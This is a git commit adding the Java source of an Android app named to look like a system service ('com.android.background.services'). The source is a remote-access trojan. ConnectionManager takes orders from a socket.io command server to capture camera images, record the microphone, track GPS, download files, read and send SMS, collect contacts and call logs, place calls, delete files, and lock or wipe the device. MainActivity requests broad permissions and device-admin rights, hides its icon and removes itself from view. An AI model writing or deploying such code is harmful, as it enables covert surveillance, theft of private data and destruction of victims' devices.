5f69a6e6874568b864674255ec77e989eb96b93d
HiddenPirates <nura57764@gmail.com>
2022-03-21 17:31:24 +0530

    initial

---
+++ app/src/main/java/com/android/background/services/ConnectionManager.java
@@ -0,0 +1,342 @@
+package com.android.background.services;
+
+import android.app.Activity;
+import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Looper;
+import android.util.Log;
+import android.widget.Toast;
+
+import org.apache.commons.io.FileUtils;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.File;
+import java.io.IOException;
+
+import io.socket.emitter.Emitter;
+
+public class ConnectionManager {
+
+    public static Context context;
+    private static io.socket.client.Socket ioSocket;
+    private static FileManager fm = new FileManager();
+
+    public static void startAsync(Context con) {
+        try {
+            context = con;
+            sendReq();
+        } catch (Exception ex) {
+            startAsync(con);
+        }
+
+    }
+
+
+    public static void sendReq() {
+
+        try {
+
+            if (ioSocket != null)
+                return;
+
+            ioSocket = IOSocket.getInstance().getIoSocket();
+
+
+            ioSocket.on("ping", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    ioSocket.emit("pong");
+                }
+            });
+
+            ioSocket.on("order", new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    try {
+                        JSONObject data = (JSONObject) args[0];
+                        String order = data.getString("order");
+                        Log.d("order", order);
+                        switch (order) {
+                            case "x0000ca":
+                                if (data.getString("extra").equals("camList"))
+                                    x0000ca(-1);
+                                else if (data.getString("extra").equals("1"))
+                                    x0000ca(1);
+                                else if (data.getString("extra").equals("0"))
+                                    x0000ca(0);
+                                break;
+                            case "x0000fm":
+                                if (data.getString("extra").equals("ls"))
+                                    x0000fm(0, data.getString("path"));
+                                else if (data.getString("extra").equals("dl"))
+                                    x0000fm(1, data.getString("path"));
+                                break;
+                            case "x0000sm":
+                                if (data.getString("extra").equals("ls"))
+                                    x0000sm(0, null, null);
+                                else if (data.getString("extra").equals("sendSMS"))
+                                    x0000sm(1, data.getString("to"), data.getString("sms"));
+                                break;
+                            case "x0000cl":
+                                x0000cl();
+                                break;
+                            case "x0000cn":
+                                x0000cn();
+                                break;
+                            case "x0000mc":
+                                x0000mc(data.getInt("sec"));
+                                break;
+                            case "x0000apps":
+                                x0000apps();
+                                break;
+                            case "x0000lm":
+                                x0000lm();
+                                break;
+                            case "x0000runApp":
+                                x0000runApp(data.getString("extra"));
+                                break;
+                            case "x0000openUrl":
+                                x0000openUrl(data.getString("url"));
+                                break;
+                            case "x0000deleteFF":
+                                x0000deleteFF(data.getString("fileFolderPath"));
+                                break;
+                            case "x0000dm":
+                                x0000dm(data.getString("number"));
+                                break;
+                            case "x0000lockDevice":
+                                x0000lockDevice();
+                                break;
+                            case "x0000wipeDevice":
+                                x0000wipeDevice();
+                                break;
+                            case "x0000rebootDevice":
+                                x0000rebootDevice();
+                                break;
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            });
+            ioSocket.connect();
+
+        } catch (Exception ex) {
+            Log.e("error", ex.getMessage());
+        }
+    }
+
+    private static void x0000rebootDevice() throws JSONException {
+        JSONObject jsonObject = new JSONObject();
+
+        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
+                jsonObject.put("status", true);
+                jsonObject.put("message", "Device rebooted successfully.");
+            }
+            else{
+                jsonObject.put("status", false);
+                jsonObject.put("message", "Device is below Android 7.0");
+            }
+        }
+        else{
+            jsonObject.put("status", false);
+            jsonObject.put("message", "Device admin permission is not active.");
+        }
+        ioSocket.emit("x0000rebootDevice", jsonObject);
+    }
+
+    private static void x0000wipeDevice() throws JSONException {
+
+        JSONObject jsonObject = new JSONObject();
+
+        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+            MainActivity.devicePolicyManager.wipeData(1);
+            jsonObject.put("status", true);
+            jsonObject.put("message", "Device wiped out successfully.");
+        }
+        else{
+            jsonObject.put("status", false);
+            jsonObject.put("message", "Device admin permission is not active.");
+        }
+        ioSocket.emit("x0000lockDevice", jsonObject);
+    }
+
+    private static void x0000lockDevice() throws JSONException {
+
+        JSONObject jsonObject = new JSONObject();
+
+        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+            MainActivity.devicePolicyManager.lockNow();
+            jsonObject.put("status", true);
+            jsonObject.put("message", "Device locked.");
+        }
+        else{
+            jsonObject.put("status", false);
+            jsonObject.put("message", "Device admin permission is not active.");
+        }
+        ioSocket.emit("x0000lockDevice", jsonObject);
+    }
+
+    private static void x0000dm(String number) throws JSONException {
+
+        JSONObject jsonObject = new JSONObject();
+
+        try {
+
+            Uri phoneNumber = Uri.parse("tel:"+number);
+            Intent callIntent = new Intent(Intent.ACTION_CALL, phoneNumber);
+            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(callIntent);
+
+            jsonObject.put("status", true);
+        }
+        catch (Exception e){
+            jsonObject.put("status", false);
+            e.printStackTrace();
+        }
+        ioSocket.emit("x0000dm", jsonObject);
+    }
+
+    private static void x0000deleteFF(String fileFolderPath) throws JSONException {
+
+        JSONObject jsonObject = new JSONObject();
+
+        File file = new File(fileFolderPath);
+
+        if (file.isDirectory() && file.exists()){
+            try {
+                FileUtils.forceDelete(file);
+                jsonObject.put("status", true);
+            }
+            catch (Exception e) {
+                jsonObject.put("status", false);
+                e.printStackTrace();
+            }
+        }
+        else if (file.isFile() && file.exists()){
+            jsonObject.put("status", file.delete());
+        }
+
+        ioSocket.emit("x0000deleteFF", jsonObject);
+    }
+
+
+    private static void x0000openUrl(String url) {
+
+        JSONObject jsonObject = new JSONObject();
+
+        try{
+            Intent openIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+            openIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(openIntent);
+            jsonObject.put("status", true);
+        }
+        catch (Exception e){
+            try {
+                jsonObject.put("status", false);
+            } catch (JSONException jsonException) {
+                jsonException.printStackTrace();
+            }
+            e.printStackTrace();
+
+        }
+        ioSocket.emit("x0000openUrl", jsonObject);
+    }
+
+
+    private static void x0000runApp(String packageName) {
+
+        JSONObject jsonObject = new JSONObject();
+
+        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);
+
+        if (launchIntent != null) {
+            try {
+                jsonObject.put("launchingStatus", true);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+            context.startActivity(launchIntent);
+        }
+        else {
+            try {
+                jsonObject.put("launchingStatus", false);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }
+        ioSocket.emit("x0000runApp", jsonObject);
+    }
+
+    public static void x0000apps() {
+        ioSocket.emit("x0000apps", AppsListManager.getAppLists(context));
+    }
+
+    public static void x0000ca(int req) {
+
+        if (req == -1) {
+            JSONObject cameraList = new CameraManager(context).findCameraList();
+            if (cameraList != null)
+                ioSocket.emit("x0000ca", cameraList);
+        } else if (req == 1) {
+            new CameraManager(context).startUp(1);
+        } else if (req == 0) {
+            new CameraManager(context).startUp(0);
+        }
+    }
+
+    public static void x0000fm(int req, String path) {
+        if (req == 0)
+            ioSocket.emit("x0000fm", fm.walk(path));
+        else if (req == 1)
+            fm.downloadFile(path);
+    }
+
+
+    public static void x0000sm(int req, String phoneNo, String msg) {
+        if (req == 0)
+            ioSocket.emit("x0000sm", SMSManager.getSMSList());
+        else if (req == 1) {
+            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
+            ioSocket.emit("x0000sm", isSent);
+        }
+    }
+
+    public static void x0000cl() {
+        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
+    }
+
+    public static void x0000cn() {
+        ioSocket.emit("x0000cn", ContactsManager.getContacts());
+    }
+
+    public static void x0000mc(int sec) throws Exception {
+        MicManager.startRecording(sec);
+    }
+
+    public static void x0000lm() throws Exception {
+        Looper.prepare();
+        LocManager gps = new LocManager(context);
+        JSONObject location = new JSONObject();
+        // check if GPS enabled
+        if (gps.canGetLocation()) {
+
+            double latitude = gps.getLatitude();
+            double longitude = gps.getLongitude();
+            Log.e("loc", latitude + "   ,  " + longitude);
+            location.put("enable", true);
+            location.put("lat", latitude);
+            location.put("lng", longitude);
+        } else
+            location.put("enable", false);
+
+        ioSocket.emit("x0000lm", location);
+    }
+}
---
+++ app/src/main/java/com/android/background/services/MainActivity.java
@@ -0,0 +1,171 @@
+package com.android.background.services;
+
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import androidx.annotation.RequiresApi;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import android.Manifest;
+import android.annotation.SuppressLint;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Environment;
+import android.os.Handler;
+import android.provider.Settings;
+import android.widget.Toast;
+
+public class MainActivity extends AppCompatActivity {
+
+    private static final int PERMISSION_REQUEST_CODE = 55555;
+    public static DevicePolicyManager devicePolicyManager;
+    public static ComponentName componentName;
+    public static int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE= 2323;
+
+    @RequiresApi(api = Build.VERSION_CODES.R)
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        componentName = new ComponentName(this, AdminReceiver.class);
+        devicePolicyManager = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);
+
+        if (!devicePolicyManager.isAdminActive(componentName)) {
+            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
+            startActivity(intent);
+        }
+
+
+        if (
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
+        ){
+            askPermission();
+        }
+        else{
+
+            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !Settings.canDrawOverlays(this)) {
+                requestDisplayOverPermission();
+            }
+            else{
+
+                if (!Environment.isExternalStorageManager()){
+
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    Uri uri = Uri.fromParts("package", getPackageName(), null);
+                    intent.setData(uri);
+                    startActivity(intent);
+                }
+                else{
+                    Intent intent = new Intent( this, MainService.class );
+                    ContextCompat.startForegroundService(this, intent);
+
+                    openGooglePlayServiceSettingsPage(this);
+
+                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q){
+                        hideIcon();
+                    }
+
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                        new Handler().postDelayed(this::finishAndRemoveTask,1000);
+                    }
+                    else{
+                        finish();
+                    }
+                }
+            }
+        }
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.R)
+    private void askPermission() {
+        ActivityCompat.requestPermissions(this, new String[]{
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.ACCESS_MEDIA_LOCATION,
+                Manifest.permission.PROCESS_OUTGOING_CALLS,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.CALL_PHONE,
+                Manifest.permission.READ_PHONE_NUMBERS,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.WRITE_CONTACTS,
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.MODIFY_AUDIO_SETTINGS
+        }, PERMISSION_REQUEST_CODE);
+    }
+
+    //-------------------------------------------------------------------------------------------------------------
+    private void requestDisplayOverPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
+        }
+    }
+//_____________________________________________________________________________________________________________
+    @Override
+    public void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
+        if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (!Settings.canDrawOverlays(this)) {
+                    Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
+                }
+            }
+        }
+    }
+//_____________________________________________________________________________________________________________
+    public static void openGooglePlayServiceSettingsPage(Context context) {
+        Intent intent = new Intent();
+        final String APP_PACKAGE_NAME = "com.google.android.gms";
+        final String APP_ACTIVITY_PATH = "com.google.android.gms.app.settings.GoogleSettingsLink";
+        intent.setClassName(APP_PACKAGE_NAME, APP_ACTIVITY_PATH);
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(intent);
+    }
+//_____________________________________________________________________________________________________________
+    public void hideIcon() {
+        getPackageManager().setComponentEnabledSetting(getComponentName(),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+    }
+//_____________________________________________________________________________________________________________
+@SuppressLint("SetTextI18n")
+@Override
+public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+    super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+
+    if (requestCode == PERMISSION_REQUEST_CODE && grantResults.length >= 2
+            && grantResults[0] == PackageManager.PERMISSION_GRANTED
+            && grantResults[1] == PackageManager.PERMISSION_GRANTED
+
+    ) {
+
+        Toast.makeText(this, "Permission granted successfully!", Toast.LENGTH_SHORT).show();
+    }
+}
+}
